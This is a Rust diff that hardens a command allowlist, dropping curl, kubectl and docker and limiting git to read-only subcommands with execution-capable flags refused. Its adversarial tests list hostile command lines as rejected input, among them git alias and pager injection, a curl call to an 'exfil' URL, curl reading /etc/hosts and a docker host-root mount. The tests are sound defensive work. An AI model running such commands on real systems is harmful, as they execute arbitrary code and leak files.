@@ -28,11 +28,19 @@ pub fn to_argv(line: &str) -> Vec<String> {
 /// line to a shell, so the program itself has to be vouched for. Everything
 /// here reads state without changing it.
 const ALLOWED: &[&str] = &[
-    "git", "grep", "egrep", "fgrep", "rg", "cat", "head", "tail", "ls", "wc", "stat", "file",
-    "jq", "kubectl", "docker", "plutil", "uname", "sw_vers", "date", "echo", "test", "true",
-    "false", "dirname", "basename", "realpath", "readlink", "printenv", "which", "sort", "uniq",
-    "cut", "tr", "diff", "cmp", "md5", "shasum", "curl",
+    "grep", "egrep", "fgrep", "rg", "cat", "head", "tail", "ls", "wc", "stat", "file", "jq",
+    "plutil", "uname", "sw_vers", "date", "echo", "test", "true", "false", "dirname", "basename",
+    "realpath", "readlink", "printenv", "which", "sort", "uniq", "cut", "tr", "diff", "cmp",
+    "md5", "shasum", "git",
 ];
+
+const GIT_SUBCOMMANDS: &[&str] = &[
+    "rev-parse", "log", "status", "describe", "show", "diff", "branch", "tag", "remote",
+    "ls-files", "ls-remote", "cat-file", "rev-list", "symbolic-ref", "shortlog", "blame",
+];
+
+const GIT_FORBIDDEN_FLAGS: &[&str] =
+    &["-c", "--config", "--exec-path", "-C", "--upload-pack", "--receive-pack", "--namespace", "--git-dir", "--work-tree"];
 
 /// The program part of a declared command, without its directory.
 pub fn program_of(line: &str) -> Option<String> {
@@ -42,7 +50,30 @@ pub fn program_of(line: &str) -> Option<String> {
 }
 
 pub fn is_allowed_program(line: &str) -> bool {
-    program_of(line).map(|p| ALLOWED.contains(&p.as_str())).unwrap_or(false)
+    let Some(program) = program_of(line) else { return false };
+    if !ALLOWED.contains(&program.as_str()) {
+        return false;
+    }
+    if program == "git" {
+        return git_is_read_only(&to_argv(line)[1..]);
+    }
+    true
+}
+
+/// git is on the list because a version check is the commonest thing a memory
+/// wants to assert, but git is also an execution engine: an alias beginning
+/// with `!` runs through a shell, and `-c` can define one inline. So the
+/// subcommand is vouched for and the flags that reach the engine are refused.
+fn git_is_read_only(args: &[String]) -> bool {
+    for a in args {
+        if GIT_FORBIDDEN_FLAGS.iter().any(|f| a == f || a.starts_with(&format!("{f}="))) {
+            return false;
+        }
+    }
+    args.iter()
+        .find(|a| !a.starts_with('-'))
+        .map(|sub| GIT_SUBCOMMANDS.contains(&sub.as_str()))
+        .unwrap_or(false)
 }
 
 pub fn is_safe(line: &str) -> bool {
@@ -281,8 +312,26 @@ mod adversarial {
     }
 
     #[test]
+    fn programa_que_e_motor_de_execucao_saiu_da_lista() {
+        for linha in [
+            "git -c \"alias.pwn=!touch /tmp/x\" pwn",
+            "git -c core.pager=touch\\ /tmp/x log",
+            "git --exec-path=/tmp log",
+            "git --upload-pack=touch log",
+            "curl -o /tmp/x file:///etc/hosts",
+            "curl http://exemplo/exfil",
+            "kubectl exec pod -- touch /tmp/x",
+            "docker run -v /:/host alpine touch /host/tmp/x",
+            "git push origin main",
+            "git commit -m x",
+        ] {
+            assert!(!is_allowed_program(linha), "deveria recusar: {linha}");
+        }
+    }
+
+    #[test]
     fn verificacao_legitima_continua_permitida() {
-        for linha in ["git rev-parse HEAD", "grep -c foo Cargo.toml", "cat Cargo.toml", "kubectl get pods"] {
+        for linha in ["git rev-parse HEAD", "git log --oneline -1", "git describe --tags", "grep -c foo Cargo.toml", "cat Cargo.toml"] {
             assert!(is_allowed_program(linha), "deveria permitir: {linha}");
         }
     }
